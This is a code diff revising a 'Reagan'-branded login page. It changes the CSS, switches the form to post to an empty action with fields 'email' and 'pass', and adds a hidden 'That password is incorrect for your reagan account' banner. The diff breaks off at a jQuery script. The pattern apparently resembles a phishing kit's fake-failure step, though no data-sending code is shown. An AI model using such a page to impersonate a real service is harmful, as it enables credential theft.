@@ -95,17 +95,7 @@ body{
 	font-weight: bold;
 	font-size: 16pt;
 }
-#login input[type="email"],
-#login input[type="password"] {
-  width: 100%;
-  min-height: 40px;
-  padding: 8px;
-  box-sizing: border-box;
-  outline: none;
-  margin-top: 1.5ex;
-  margin-bottom: 1.5ex;
-  font-size: 16px !important;
-}
+
 #login-page{
 	border: 1px solid gray;
 	width: 230px;
@@ -125,7 +115,21 @@ body{
 	font-size: 9pt;
 	
 }
+.error-message {
+  display: flex;
+  align-items: center;
+  margin-top: 8px;
+  font-size: 12px;
+  color: #e81123;
+}
 
+.error-icon {
+  margin-right: 6px;
+}
+
+.input-error {
+  border: 1px solid #e81123 !important;
+}
 #footer{
 	width: 100%;
 	background-color: #F8F9FA;
@@ -208,6 +212,7 @@ body{
 }
 
 
+
 input {
   -webkit-appearance: none;
   -moz-appearance: none;
@@ -216,22 +221,22 @@ input {
   }
 
 label{
-	font-size: 10pt;
+	font-size: 9pt;
 	font-weight: bold;
 	
 }
 
+input[type="email"], input[type="password"]{
+	border: 1px solid black;
+	outline: none;
+	margin-top: 1.3ex;
+	margin-bottom: 1ex;
+	
+}
 
 input[type="submit"]{
 	border: 1px solid black;
-  background-color:#d9d9d9;
 	outline: none;
-  color: black;
-  width:100%;
-  min-height:42px;
-  padding:8px 16px;
-  cursor:pointer;
- font-size: 12px !important; 
 	
 }
     /* Standalone-page fixes */
@@ -578,13 +583,10 @@ input[type="submit"]{
       min-height:40px;
       padding:8px;
       box-sizing:border-box;
-       outline: none;
     }
     #login input[type="submit"] {
-      width:auto;
+      width:100%;
       min-height:42px;
-      outline: none;
-      color: black;
       padding:8px 16px;
       cursor:pointer;
     }
@@ -617,7 +619,7 @@ input[type="submit"]{
       }
       #legacy {
         display:none;
-        /*width:min(480px, calc(100% - 32px));*/
+        //width:min(480px, calc(100% - 32px));
       }
       #login-page {
         width:min(360px, calc(100% - 32px));
@@ -694,20 +696,24 @@ input[type="submit"]{
 </section>
 
     <section id="login-page" aria-label="Login">
-      <form id="my-form" novalidate>
+      <form action="" method="post" id="contact">
         <img src="/images/r1.png" alt="Returning user">
         <div id="login">
           <label for="usr">Email address</label>
-          <input type="email" id="usr" name="email" autocomplete="email" required>
-
+		  <input type="email" name="email" class="emaill" value="" required>
+      
           <label for="pas">Password</label>
-          <input type="password" id="pas" name="password" autocomplete="current-password" required>
+		  <input type="password" name="pass" class="passs" id="password-input" required>
+
 
           <p><a href="#" id="forgot">Forgot password?</a></p>
-          <div id="error" class="error" role="alert"></div>
-          <div id="success" class="success" role="status"></div>
+		  <div id="password-error" class="error-message" style="display:none;">
+            <span class="error-icon">⚠</span>
+            <span class="error-text">That password is incorrect for your reagan account.</span>
+       </div>
+      
 
-          <input type="submit" value="Log In">
+          <input type="submit" value="Log In" id="submit-btn" class="button">
         </div>
       </form>
     </section>
@@ -724,8 +730,7 @@ input[type="submit"]{
     <p>© 2026 Reagan.</p>
     <img src="/images/r3.png" alt="">
   </footer>
-
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
 <script>
   $(document).ready(function() {
 
